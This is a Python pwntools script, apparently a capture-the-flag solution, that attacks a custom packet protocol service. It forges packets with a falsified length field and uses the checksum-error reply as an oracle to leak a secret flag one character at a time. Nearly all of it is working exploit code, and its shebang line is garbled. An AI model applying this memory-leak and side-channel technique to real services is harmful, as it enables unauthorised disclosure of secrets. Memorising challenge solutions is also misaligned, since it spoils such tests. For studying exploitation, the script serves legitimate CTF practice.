#!/usr/bin/env pyt * 10hon
# -*- coding: utf-8 -*-
import string

from pwn import *

ECHO_PROTO = 0x50
ECHO_REPLY_PROTO = 0x51
FLAG_PROTO = 0x80
FLAG_REPLY_PROTO = 0x81
WRONG_CHECKSUM_PROTO = 0x30
WRONG_PASS_PROTO = 0x31
CORRECT_PASS_PROTO = 0x21

HDR_SIZE = 6

# Set up pwntools for the correct architecture
context.terminal = ['tmux', 'new-window']

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1337)

r = remote(host, port)


def calculate_checksum(pkt):
    tot = 0
    overflows = 0

    for i in range(0, len(pkt), 2):

        tot += u16(pkt[i: i+2], endian='little')

        if tot > 0xffff:
            overflows += 1
            tot = tot - 0xffff - 1

    tot += overflows
    tot = ~tot
    if tot < 0:
        tot = tot + 0xffff + 1

    return tot


def build_pkt(data, repeats, proto, fake_len=False):

    data_len = len(data)
    if fake_len:
        data_len -= 1
    pkt = b''
    pkt += p16(proto, endian='big')
    pkt += p8(repeats)
    pkt += p8(data_len)
    pkt += b'\x00\x00'
    pkt += data

    return pkt


def recv_pkt():
    resp = r.recv(HDR_SIZE)
    resp_proto = u16(resp[0:2], endian='big')
    resp_repeats = resp[2]
    resp_data_len = resp[3]
    # print(f"Received repeats: {hex(resp_repeats)}")
    # print(f"Received len: {hex(resp_data_len)}")
    if resp_data_len > 0:
        resp = r.recv(resp_data_len)
        # print(resp)
    # print(f"Received proto: {hex(resp_proto)}")
    return resp_proto


def send_pkt(data, repeats, proto):

    pkt = build_pkt(data, repeats, proto)
    checksum = p16(calculate_checksum(pkt), endian='little')
    pkt = pkt[:4] + checksum + pkt[6:]
    r.send(pkt)
    recv_pkt()


def find_letter_at_len(x):

    send_pkt(b"bb", x, FLAG_PROTO)
    payload = b'A' * 0x19
    base_pkt = build_pkt(payload, 1, ECHO_PROTO)

    for c in string.printable:
        # for c in 'a':
        check_pkt = build_pkt(payload + c.encode(), 1,
                              ECHO_PROTO, fake_len=True)
        check_checksum = p16(calculate_checksum(check_pkt), endian='little')
        base_pkt = base_pkt[:4] + check_checksum + base_pkt[6:]
        # print(base_pkt)
        r.send(base_pkt)
        resp_p = recv_pkt()
        if resp_p != WRONG_CHECKSUM_PROTO:
            print(c)
            break
        # print(c, hex(resp_p))


for i in range(0x20):
    find_letter_at_len(i)
